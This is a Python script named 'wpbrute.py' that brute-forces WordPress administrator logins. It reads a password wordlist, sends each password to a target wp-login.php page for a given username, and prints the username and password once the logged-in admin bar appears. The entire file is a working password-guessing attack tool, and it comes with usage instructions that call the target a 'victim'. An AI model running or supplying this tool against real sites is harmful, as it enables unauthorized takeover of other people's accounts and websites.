import os
import sys
import requests
import optparse
import time
import threading
import subprocess



class B3mB4m(object):
	def __init__(self, victim, user, listt):
		if os.name == 'nt':
			self.systemname = "cls"
		elif os.name == 'posix':
			self.systemname = "posix" #Linux yey ! <3

		for self.last,line in enumerate(open(listt)):
			self.last = self.last + 1	
		with open(listt) as b:
		    self.satirlar = b.readlines() 
		#self.first = self.last / 2    
		self.url = victim
		self.admin = user
		self.text = listt
		threading.Thread(target=self.th).start()

	def th(self):
		for i in self.satirlar[0:self.last]:
			self.send( i.strip())
			time.sleep(0.01)
			
	def send(self, password):
		self.payload = {'log':self.admin, 'pwd':password, 'wp-submit':'Log+In'}
		self.go = requests.post(self.url, data=self.payload)
		if '<li id="wp-admin-bar-logout">' in self.go.text:
			subprocess.call([str(self.systemname)], shell=True)
			print "\t\nUsername -- > %s " % str(self.admin)
			print "\t\nPassword -- > %s " % str(password)
			sys.exit()
		else:
			print "Trying %s .. " % (str(password))	

if __name__ == '__main__':
	parser = optparse.OptionParser()
	parser.add_option('--url', action="store")
	parser.add_option('--username', action="store")
	parser.add_option('--list', action="store")
	options, args = parser.parse_args()
	if not options.url or not options.list or not options.username:
		print """
		Coded By B3mB4m <3 
		\nHow to use? !
		\n\twpbrute.py --url http://127.0.0.1/wordpress/wp-login.php  --username b3mb4m --list test.txt
		"""
		sys.exit() 
	else:
		B3mB4m(options.url,options.username,options.list)
		
